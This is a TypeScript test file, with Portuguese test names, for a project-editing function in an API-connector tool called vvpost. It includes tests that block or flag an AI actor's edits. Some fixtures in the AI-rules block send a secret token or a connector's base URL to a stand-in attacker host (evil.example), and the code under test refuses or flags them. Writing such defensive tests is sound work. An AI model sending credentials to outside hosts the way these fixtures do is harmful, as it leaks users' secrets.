import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { readVault, updateVault } from '@vvpost/core/vault'
import type { Connector, Flow } from '@vvpost/schemas'
import { applyProjectOps, readReviewMarks, type ProjectOp } from '../src/main/project'
import { SECRETS_FILE } from '../src/main/workspace/vault'

const dirs: string[] = []
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true })
})

function workspace(files: Record<string, unknown> = {}): string {
  const dir = mkdtempSync(join(tmpdir(), 'vvpost-project-'))
  dirs.push(dir)
  for (const [path, data] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true })
    writeFileSync(join(dir, path), typeof data === 'string' ? data : `${JSON.stringify(data, null, 2)}\n`)
  }
  return dir
}

const read = (dir: string, path: string) => JSON.parse(readFileSync(join(dir, path), 'utf8'))

const base: Connector = {
  id: 'base',
  name: 'Base',
  version: '1.0.0',
  config: { baseUrl: '{{BASE_URL}}', auth: { type: 'bearer', token: '{{API_TOKEN}}' } }
}
const child: Connector = {
  id: 'billing',
  name: 'Billing',
  version: '1.0.0',
  extends: 'base',
  config: { basePath: '/billing' },
  endpoints: [{ id: 'list', name: 'Listar', method: 'GET', path: '/charges' }]
}
const env = {
  id: 'env.dev',
  name: 'Dev',
  variables: {
    BASE_URL: { type: 'string', value: 'https://api.exemplo.com' },
    API_TOKEN: { type: 'string', value: '__REQUIRED_SECRET__', isSecret: true }
  }
}
const flow: Flow = {
  id: 'cobranca',
  name: 'Cobrança',
  nodes: [{ id: 'n1', name: 'Listar', type: 'request', request: { connector: 'billing', endpoint: 'list' } }],
  edges: []
}

function seeded(): string {
  return workspace({
    'connectors/base.connector.vvpost.json': base,
    'connectors/billing.connector.vvpost.json': child,
    'connectors/billing.connector.vvpost.md': '# Billing\n',
    'environments/dev.env.json': env,
    'flows/cobranca.flow.vvpost.json': flow
  })
}

describe('applyProjectOps', () => {
  it('cria conector, endpoint, cenário, ambiente, fluxo e documentação num lote', async () => {
    const dir = workspace()
    const ops: ProjectOp[] = [
      { op: 'upsertEnvironment', environment: env as never },
      { op: 'upsertConnector', connector: base },
      { op: 'upsertConnector', connector: { ...child, endpoints: [] } },
      { op: 'upsertEndpoint', connectorId: 'billing', endpoint: { id: 'list', name: 'Listar', method: 'GET', path: '/charges' } },
      {
        op: 'upsertScenario',
        connectorId: 'billing',
        endpointId: 'list',
        scenario: { id: 'ok', name: 'OK', assertions: [{ target: 'status', operator: 'equals', expected: 200 }] }
      },
      { op: 'upsertFlow', flow },
      { op: 'writeDoc', connectorId: 'billing', markdown: '# Billing\n\n## Listar {#list}\n' }
    ]
    const result = await applyProjectOps(dir, ops)
    expect(result.errors).toEqual([])
    expect(result.ok).toBe(true)
    expect(result.changes.map((c) => `${c.action} ${c.path}`)).toEqual([
      'create connectors/base.connector.vvpost.json',
      'create connectors/billing.connector.vvpost.json',
      'create connectors/billing.connector.vvpost.md',
      'create environments/dev.env.json',
      'create flows/cobranca.flow.vvpost.json'
    ])
    const saved = read(dir, 'connectors/billing.connector.vvpost.json')
    expect(Object.keys(saved)[0]).toBe('$schema')
    expect(saved.endpoints[0].scenarios[0].id).toBe('ok')
    expect(readFileSync(join(dir, 'connectors/billing.connector.vvpost.md'), 'utf8')).toContain('{#list}')
  })

  it('é atômico: um erro no fim não grava nada', async () => {
    const dir = workspace()
    const result = await applyProjectOps(dir, [
      { op: 'upsertConnector', connector: base },
      { op: 'upsertEndpoint', connectorId: 'nao-existe', endpoint: { id: 'x', name: 'X', method: 'GET', path: '/' } }
    ])
    expect(result.ok).toBe(false)
    expect(result.errors).toEqual([{ op: 1, message: 'conector "nao-existe" não existe' }])
    expect(existsSync(join(dir, 'connectors'))).toBe(false)
  })

  it('dryRun mostra as mudanças sem gravar', async () => {
    const dir = seeded()
    const before = readFileSync(join(dir, 'connectors/billing.connector.vvpost.json'), 'utf8')
    const result = await applyProjectOps(dir, [{ op: 'patchConnector', id: 'billing', set: { name: 'Cobranças' } }], { dryRun: true })
    expect(result.ok).toBe(true)
    expect(result.changes).toMatchObject([{ path: 'connectors/billing.connector.vvpost.json', action: 'update' }])
    expect(readFileSync(join(dir, 'connectors/billing.connector.vvpost.json'), 'utf8')).toBe(before)
  })

  it('renomear um conector leva o extends dos filhos, os fluxos, o arquivo e a documentação', async () => {
    const dir = seeded()
    const result = await applyProjectOps(dir, [
      { op: 'moveConnector', id: 'base', newId: 'plataforma' },
      { op: 'moveConnector', id: 'billing', newId: 'cobranca.v2' }
    ])
    expect(result.errors).toEqual([])
    expect(existsSync(join(dir, 'connectors/base.connector.vvpost.json'))).toBe(false)
    expect(read(dir, 'connectors/plataforma.connector.vvpost.json').id).toBe('plataforma')
    expect(read(dir, 'connectors/cobranca.v2.connector.vvpost.json').extends).toBe('plataforma')
    expect(readFileSync(join(dir, 'connectors/cobranca.v2.connector.vvpost.md'), 'utf8')).toBe('# Billing\n')
    expect(existsSync(join(dir, 'connectors/billing.connector.vvpost.md'))).toBe(false)
    expect(read(dir, 'flows/cobranca.flow.vvpost.json').nodes[0].request.connector).toBe('cobranca.v2')
  })

  it('move um endpoint de conector e os nós dos fluxos acompanham', async () => {
    const dir = seeded()
    const result = await applyProjectOps(dir, [
      { op: 'upsertConnector', connector: { id: 'ledger', name: 'Ledger', version: '1.0.0', extends: 'base' } },
      { op: 'moveEndpoint', connectorId: 'billing', endpointId: 'list', toConnectorId: 'ledger', newId: 'charges' }
    ])
    expect(result.errors).toEqual([])
    expect(read(dir, 'connectors/billing.connector.vvpost.json').endpoints).toBeUndefined()
    expect(read(dir, 'connectors/ledger.connector.vvpost.json').endpoints[0].id).toBe('charges')
    expect(read(dir, 'flows/cobranca.flow.vvpost.json').nodes[0].request).toEqual({ connector: 'ledger', endpoint: 'charges' })
  })

  it('recusa apagar um conector com filhos, herança circular e pai inexistente', async () => {
    const dir = seeded()
    expect((await applyProjectOps(dir, [{ op: 'deleteConnector', id: 'base' }])).errors[0]?.message).toContain('tem filhos (billing)')
    expect((await applyProjectOps(dir, [{ op: 'patchConnector', id: 'base', set: { extends: 'billing' } }])).errors[0]?.message).toContain(
      'herança circular'
    )
    expect((await applyProjectOps(dir, [{ op: 'moveConnector', id: 'billing', extends: 'nada' }])).errors[0]?.message).toContain(
      'herda de "nada"'
    )
  })

  it('apagar o conector apaga a documentação e avisa dos fluxos que o usam', async () => {
    const dir = seeded()
    const result = await applyProjectOps(dir, [{ op: 'deleteConnector', id: 'billing' }])
    expect(result.ok).toBe(true)
    expect(result.warnings[0]?.message).toContain('cobranca')
    expect(existsSync(join(dir, 'connectors/billing.connector.vvpost.md'))).toBe(false)
  })

  it('upsertEndpoint mantém os cenários; upsertEnvironment mantém valores existentes', async () => {
    const dir = seeded()
    await applyProjectOps(dir, [
      {
        op: 'upsertScenario',
        connectorId: 'billing',
        endpointId: 'list',
        scenario: { id: 'ok', name: 'OK', assertions: [{ target: 'status', operator: 'equals', expected: 200 }] }
      }
    ])
    const result = await applyProjectOps(dir, [
      { op: 'upsertEndpoint', connectorId: 'billing', endpoint: { id: 'list', name: 'Listar cobranças', method: 'GET', path: '/charges' } },
      {
        op: 'upsertEnvironment',
        environment: {
          id: 'env.dev',
          name: 'Dev',
          variables: { BASE_URL: { type: 'string', value: 'https://outra' }, TIMEOUT: { type: 'number', value: 30 } }
        }
      }
    ])
    expect(result.errors).toEqual([])
    const endpoint = read(dir, 'connectors/billing.connector.vvpost.json').endpoints[0]
    expect(endpoint.name).toBe('Listar cobranças')
    expect(endpoint.scenarios[0].id).toBe('ok')
    const vars = read(dir, 'environments/dev.env.json').variables
    expect(vars.BASE_URL.value).toBe('https://api.exemplo.com')
    expect(vars.TIMEOUT.value).toBe(30)
  })

  it('avisa corpo padrão fora do bodySchema que o lote criou ou mudou, sem barrar a gravação', async () => {
    const dir = seeded()
    const schema = { type: 'object', required: ['amount'], properties: { amount: { type: 'number' } } }
    const charge = { id: 'charge', name: 'Cobrar', method: 'POST' as const, path: '/charges', bodySchema: schema }
    const bad = await applyProjectOps(dir, [{ op: 'upsertEndpoint', connectorId: 'billing', endpoint: { ...charge, body: { amount: 'dez' } } }])
    expect(bad.ok).toBe(true)
    expect(bad.warnings.map((w) => w.message)).toEqual([expect.stringMatching(/endpoint "billing\/charge": corpo padrão fora do bodySchema \(\/amount: .+\); o vvpost validate do CI reprova/)])
    // Um lote que não mexe no endpoint não repete o aviso; {{VAR}} inteira só é conhecida no disparo.
    const other = await applyProjectOps(dir, [{ op: 'upsertEndpoint', connectorId: 'billing', endpoint: { id: 'list', name: 'Listar todas', method: 'GET', path: '/charges' } }])
    expect(other.warnings).toEqual([])
    const fixed = await applyProjectOps(dir, [{ op: 'upsertEndpoint', connectorId: 'billing', endpoint: { ...charge, body: { amount: '{{AMOUNT}}' } } }])
    expect(fixed.warnings).toEqual([])
  })

  it('avisa resposta de exemplo fora do schema dela que o lote criou ou mudou', async () => {
    const dir = seeded()
    const schema = { type: 'object', required: ['id'] }
    const list = { id: 'list', name: 'Listar', method: 'GET' as const, path: '/charges' }
    const bad = await applyProjectOps(dir, [
      { op: 'upsertEndpoint', connectorId: 'billing', endpoint: { ...list, examples: [{ id: 'ok', name: 'Lista', status: 200, body: { items: [] }, schema }] } }
    ])
    expect(bad.ok).toBe(true)
    expect(bad.warnings.map((w) => w.message)).toEqual([
      expect.stringMatching(/^endpoint "billing\/list": exemplo de resposta "Lista" fora do schema dele \(\/: .*id.*\); o vvpost validate do CI reprova$/)
    ])
    const fixed = await applyProjectOps(dir, [
      { op: 'upsertEndpoint', connectorId: 'billing', endpoint: { ...list, examples: [{ id: 'ok', name: 'Lista', status: 200, body: { id: 'x' }, schema }] } }
    ])
    expect(fixed.warnings).toEqual([])
  })

  it('avisa corpo fora do bodySchema num fluxo de requisição', async () => {
    const dir = workspace({
      'flows/pagamentos/pagamentos.flow.vvpost.json': { id: 'pagamentos', name: 'Pagamentos', defaults: { baseUrl: 'https://pag.example' }, nodes: [] },
      'environments/dev.env.json': env
    })
    const request: Flow = {
      id: 'pagamentos.pagar',
      name: 'Pagar',
      extends: 'pagamentos',
      nodes: [
        {
          id: 'request',
          name: 'Request',
          type: 'request',
          request: { method: 'POST', url: '/pagar', body: { valor: 'cem' }, bodySchema: { type: 'object', properties: { valor: { type: 'number' } } } }
        }
      ]
    } as Flow
    const result = await applyProjectOps(dir, [{ op: 'upsertFlow', flow: request }])
    expect(result.ok).toBe(true)
    expect(result.warnings.some((w) => /endpoint "pagamentos\/.+": corpo padrão fora do bodySchema/.test(w.message))).toBe(true)
  })

  it('segredos: o arquivo fica com __REQUIRED_SECRET__ e o valor vai para o vault, sem sobrescrever', async () => {
    const dir = seeded()
    const result = await applyProjectOps(dir, [
      { op: 'setVariable', environmentId: 'env.dev', name: 'CLIENT_SECRET', secret: true, value: 'valor-local-1' },
      { op: 'storeSecret', environmentId: 'env.dev', variable: 'API_TOKEN', value: 'token-local-1' }
    ])
    expect(result.errors).toEqual([])
    expect(result.secrets).toEqual({ stored: 2, skipped: 0 })
    expect(read(dir, 'environments/dev.env.json').variables.CLIENT_SECRET).toEqual({
      type: 'string',
      value: '__REQUIRED_SECRET__',
      isSecret: true
    })
    expect((await readVault(dir))).toEqual({ 'env.dev': { CLIENT_SECRET: 'valor-local-1', API_TOKEN: 'token-local-1' } })
    expect(existsSync(join(dir, SECRETS_FILE))).toBe(false)

    const again = await applyProjectOps(dir, [{ op: 'storeSecret', environmentId: 'env.dev', variable: 'API_TOKEN', value: 'outro' }])
    expect(again.secrets).toEqual({ stored: 0, skipped: 1 })
    expect((await readVault(dir))['env.dev']!.API_TOKEN).toBe('token-local-1')
  })

  it('recusa credencial literal e valor do vault colado num arquivo versionado', async () => {
    const dir = seeded()
    mkdirSync(join(dir, '.vvpost'), { recursive: true })
    writeFileSync(join(dir, SECRETS_FILE), JSON.stringify({ 'env.dev': { API_TOKEN: 'tok-9f8e7d6c5b' } }))
    const literal = await applyProjectOps(dir, [
      { op: 'patchConnector', id: 'base', set: { config: { baseUrl: 'https://x', auth: { type: 'bearer', token: 'abc123' } } } }
    ])
    expect(literal.errors[0]?.message).toContain('credencial escrita direto')
    const pasted = await applyProjectOps(dir, [{ op: 'writeDoc', connectorId: 'billing', markdown: 'token: tok-9f8e7d6c5b' }])
    expect(pasted.ok).toBe(false)
    expect(pasted.errors[0]?.message).toContain('API_TOKEN')
    expect(pasted.errors[0]?.message).not.toContain('tok-9f8e7d6c5b')
  })

  it('recusa caminho fora do workspace e arquivo inválido já existente', async () => {
    const dir = seeded()
    writeFileSync(join(dir, 'connectors/quebrado.connector.vvpost.json'), '{ nao é json')
    const outside = await applyProjectOps(dir, [{ op: 'upsertConnector', connector: { ...base, id: 'x' }, file: '../x.connector.vvpost.json' }])
    expect(outside.errors[0]?.message).toContain('caminho de conector inválido')
    const taken = await applyProjectOps(dir, [
      { op: 'upsertConnector', connector: { ...base, id: 'quebrado' }, file: 'connectors/quebrado.connector.vvpost.json' }
    ])
    expect(taken.errors[0]?.message).toContain('já existe')
  })
})

describe('regras da IA', () => {
  const ai = { actor: 'ai' as const }

  it('não grava valores de segredo nem transforma segredo em texto puro', async () => {
    const dir = seeded()
    expect((await applyProjectOps(dir, [{ op: 'storeSecret', environmentId: 'env.dev', variable: 'API_TOKEN', value: 'x' }], ai)).ok).toBe(false)
    const valued = await applyProjectOps(dir, [{ op: 'setVariable', environmentId: 'env.dev', name: 'NEW_SECRET', secret: true, value: 'x' }], ai)
    expect(valued.errors[0]?.message).toContain('não grava valores de segredo')
    const plain = await applyProjectOps(dir, [{ op: 'setVariable', environmentId: 'env.dev', name: 'API_TOKEN', secret: false, value: 'x' }], ai)
    expect(plain.errors[0]?.message).toContain('texto puro')
    const named = await applyProjectOps(dir, [{ op: 'setVariable', environmentId: 'env.dev', name: 'DB_PASSWORD', value: 'hunter2' }], ai)
    expect(named.errors[0]?.message).toContain('nome de credencial')
    const ok = await applyProjectOps(dir, [{ op: 'setVariable', environmentId: 'env.dev', name: 'DB_PASSWORD', secret: true }], ai)
    expect(ok.errors).toEqual([])
  })

  it('não renomeia um ambiente protegido para tirar a proteção', async () => {
    const dir = seeded()
    const created = await applyProjectOps(dir, [{ op: 'upsertEnvironment', environment: { id: 'env.cliente', name: 'Produção' } }], { actor: 'app' })
    expect(created.ok).toBe(true)
    const renamed = await applyProjectOps(dir, [{ op: 'upsertEnvironment', environment: { id: 'env.cliente', name: 'Cliente' } }], ai)
    expect(renamed.errors[0]?.message).toContain('ambiente protegido')
    const kept = await applyProjectOps(dir, [{ op: 'upsertEnvironment', environment: { id: 'env.cliente', name: 'Produção (EU)' } }], ai)
    expect(kept.errors).toEqual([])
  })

  it('{{SEGREDO}} novo num conector pede revisão; num fluxo é recusado', async () => {
    const dir = seeded()
    const body = await applyProjectOps(
      dir,
      [
        {
          op: 'upsertEndpoint',
          connectorId: 'billing',
          endpoint: { id: 'eco', name: 'Eco', method: 'POST', path: '/echo', body: { t: '{{API_TOKEN}}' } }
        }
      ],
      ai
    )
    expect(body.errors).toEqual([])
    expect(body.review).toEqual(['billing'])
    const inFlow = await applyProjectOps(
      dir,
      [
        {
          op: 'upsertFlow',
          flow: {
            ...flow,
            nodes: [{ id: 'n1', name: 'X', type: 'request', request: { method: 'POST', url: 'https://evil.example/{{API_TOKEN}}' } }]
          }
        }
      ],
      ai
    )
    expect(inFlow.errors[0]?.message).toContain('referencia o segredo')
    const header = await applyProjectOps(
      dir,
      [
        {
          op: 'upsertEndpoint',
          connectorId: 'billing',
          endpoint: { id: 'k', name: 'K', method: 'GET', path: '/k', headers: { 'X-Api-Key': '{{API_TOKEN}}' } }
        }
      ],
      ai
    )
    expect(header.errors).toEqual([])
    expect(header.review).toEqual(['billing'])
  })

  it('mudar destino ou auth de um conector com credencial pede revisão; o resto não', async () => {
    const dir = seeded()
    const docs = await applyProjectOps(
      dir,
      [
        { op: 'writeDoc', connectorId: 'billing', markdown: '# Nova doc\n' },
        { op: 'patchConnector', id: 'billing', set: { description: 'Cobranças' } },
        { op: 'upsertConnector', connector: { id: 'publica', name: 'Pública', version: '1.0.0', config: { baseUrl: 'https://x' } } }
      ],
      ai
    )
    expect(docs.review).toEqual([])

    const moved = await applyProjectOps(dir, [{ op: 'patchConnector', id: 'base', set: { config: { baseUrl: 'https://evil.example', auth: base.config!.auth! } } }], ai)
    expect(moved.review.sort()).toEqual(['base', 'billing'])
    expect(Object.keys(await readReviewMarks(dir)).sort()).toEqual(['base', 'billing'])
  })

  it('trocar a variável usada na baseUrl também pede revisão; renomear não', async () => {
    const dir = seeded()
    const renamed = await applyProjectOps(dir, [{ op: 'moveConnector', id: 'billing', newId: 'cobranca' }], ai)
    expect(renamed.review).toEqual([])
    const env = await applyProjectOps(
      dir,
      [{ op: 'setVariable', environmentId: 'env.dev', name: 'BASE_URL', value: 'https://evil.example', overwrite: true }],
      ai
    )
    expect(env.review.sort()).toEqual(['base', 'cobranca'])
  })

  it('a app (importador) não marca revisão', async () => {
    const dir = seeded()
    const result = await applyProjectOps(dir, [{ op: 'patchConnector', id: 'base', set: { config: { baseUrl: 'https://outra.example' } } }])
    expect(result.review).toEqual([])
    expect(await readReviewMarks(dir)).toEqual({})
  })
})
